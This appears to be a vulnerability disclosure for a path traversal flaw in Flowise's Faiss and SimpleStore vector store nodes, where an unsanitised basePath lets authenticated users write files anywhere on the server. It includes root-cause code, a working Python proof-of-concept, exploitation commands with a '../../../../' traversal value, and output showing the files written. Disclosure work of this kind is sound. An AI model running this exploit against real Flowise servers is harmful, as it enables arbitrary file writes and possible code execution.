summary: "Flowise: Path Traversal in Vector Store basePath\n## Summary\n\nThe Faiss and SimpleStore\
  \ (LlamaIndex) vector store implementations accept a `basePath` parameter from user-controlled\
  \ input and pass it directly to filesystem write operations without any sanitization. An authenticated\
  \ attacker can exploit this to write vector store data to arbitrary locations on the server\
  \ filesystem.\n\n## Vulnerability Details\n\n| Field | Value |\n|-------|-------|\n| Affected\
  \ File | `packages/components/nodes/vectorstores/Faiss/Faiss.ts` (lines 79, 91) |\n| Affected\
  \ File | `packages/components/nodes/vectorstores/SimpleStore/SimpleStore.ts` (lines 83-104)\
  \ |\n\n## Prerequisites\n\n1. **Authentication**: Valid API token with `documentStores:upsert-config`\
  \ permission\n2. **Document Store**: An existing Document Store with at least one processed\
  \ chunk\n3. **Embedding Credentials**: Valid embedding provider credentials (e.g., OpenAI\
  \ API key)\n\n## Root Cause\n\n### Faiss (`Faiss.ts`)\n\n```typescript\nasync upsert(nodeData:\
  \ INodeData): Promise<Partial<IndexingResult>> {\n    const basePath = nodeData.inputs?.basePath\
  \ as string  // User-controlled\n    // ...\n    const vectorStore = await FaissStore.fromDocuments(finalDocs,\
  \ embeddings)\n    await vectorStore.save(basePath)  // Direct filesystem write, no validation\n\
  }\n```\n\n### SimpleStore (`SimpleStore.ts`)\n\n```typescript\nasync upsert(nodeData: INodeData):\
  \ Promise<Partial<IndexingResult>> {\n    const basePath = nodeData.inputs?.basePath as string\
  \  // User-controlled\n    \n    let filePath = ''\n    if (!basePath) filePath = path.join(getUserHome(),\
  \ '.flowise', 'llamaindex')\n    else filePath = basePath  // Used directly without sanitization\n\
  \    \n    const storageContext = await storageContextFromDefaults({ persistDir: filePath\
  \ })  // Writes to arbitrary path\n}\n```\n\n## Impact\n\nAn authenticated attacker can:\n\
  \n1. **Write files to arbitrary locations** on the server filesystem\n2. **Overwrite existing\
  \ files** if the process has write permissions\n3. **Potential for code execution** by writing\
  \ to web-accessible directories or startup scripts\n4. **Data exfiltration** by writing to\
  \ network-mounted filesystems\n\n## Proof of Concept\n\n### poc.py\n\n```python\n#!/usr/bin/env\
  \ python3\n\"\"\"\nPOC: Path Traversal in Vector Store basePath (CWE-22)\n\nUsage:\n  python\
  \ poc.py --target http://localhost:3000 --token <API_KEY> --store-id <STORE_ID> --credential\
  \ <EMBEDDING_CREDENTIAL_ID>\n\"\"\"\n\nimport argparse\nimport json\nimport urllib.request\n\
  import urllib.error\n\ndef post_json(url, data, headers):\n    req = urllib.request.Request(\n\
  \        url,\n        data=json.dumps(data).encode(\"utf-8\"),\n        headers={**headers,\
  \ \"Content-Type\": \"application/json\"},\n        method=\"POST\",\n    )\n    with urllib.request.urlopen(req,\
  \ timeout=120) as resp:\n        return resp.status, resp.read().decode(\"utf-8\", errors=\"\
  replace\")\n\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"--target\"\
  , required=True)\n    ap.add_argument(\"--token\", required=True)\n    ap.add_argument(\"\
  --store-id\", required=True)\n    ap.add_argument(\"--credential\", required=True)\n    ap.add_argument(\"\
  --base-path\", default=\"/tmp/flowise-path-traversal-poc\")\n    args = ap.parse_args()\n\n\
  \    payload = {\n        \"storeId\": args.store_id,\n        \"vectorStoreName\": \"faiss\"\
  ,\n        \"vectorStoreConfig\": {\"basePath\": args.base_path},\n        \"embeddingName\"\
  : \"openAIEmbeddings\",\n        \"embeddingConfig\": {\"credential\": args.credential},\n\
  \    }\n\n    url = args.target.rstrip(\"/\") + \"/api/v1/document-store/vectorstore/insert\"\
  \n    headers = {\"Authorization\": f\"Bearer {args.token}\"}\n\n    try:\n        status,\
  \ body = post_json(url, payload, headers)\n        print(body)\n    except urllib.error.HTTPError\
  \ as e:\n        print(e.read().decode())\n\nif __name__ == \"__main__\":\n    main()\n```\n\
  \n### Setup\n\n1. Create a Document Store in Flowise UI\n2. Add a Document Loader (e.g., Plain\
  \ Text) with any content\n3. Click \"Process\" to create chunks\n4. Note the Store ID from\
  \ the URL\n5. Get your embedding credential ID from Settings → Credentials\n\n### Exploitation\n\
  \n```bash\n# Write to /tmp\npython poc.py \\\n  --target http://127.0.0.1:3000 \\\n  --token\
  \ <API_TOKEN> \\\n  --store-id <STORE_ID> \\\n  --credential <OPENAI_CREDENTIAL_ID> \\\n \
  \ --base-path /tmp/flowise-pwned\n\n# Path traversal variant\npython poc.py \\\n  --target\
  \ http://127.0.0.1:3000 \\\n  --token <API_TOKEN> \\\n  --store-id <STORE_ID> \\\n  --credential\
  \ <OPENAI_CREDENTIAL_ID> \\\n  --base-path \"../../../../tmp/traversal-test\"\n```\n\n###\
  \ Evidence\n\n```\n$ python poc.py --target http://127.0.0.1:3000/ --token <TOKEN> --store-id\
  \ 30af9716-ea51-47e6-af67-5a759a835100 --credential bb1baf6e-acb7-4ea0-b167-59a09a28108f --base-path\
  \ /tmp/flowise-pwned\n\n{\"numAdded\":1,\"addedDocs\":[{\"pageContent\":\"Lorem Ipsum\",\"\
  metadata\":{\"docId\":\"d84d9581-0778-454d-984e-42b372b1b555\"}}],\"totalChars\":0,\"totalChunks\"\
  :0,\"whereUsed\":[]}\n\n$ ls -la /tmp/flowise-pwned/\ntotal 16\ndrwxr-xr-x  4 user  wheel\
  \   128 Jan 17 12:00 .\ndrwxrwxrwt 12 root  wheel   384 Jan 17 12:00 ..\n-rw-r--r--  1 user\
  \  wheel  1234 Jan 17 12:00 docstore.json\n-rw-r--r--  1 user  wheel  5678 Jan 17 12:00 faiss.index\n\
  ```"
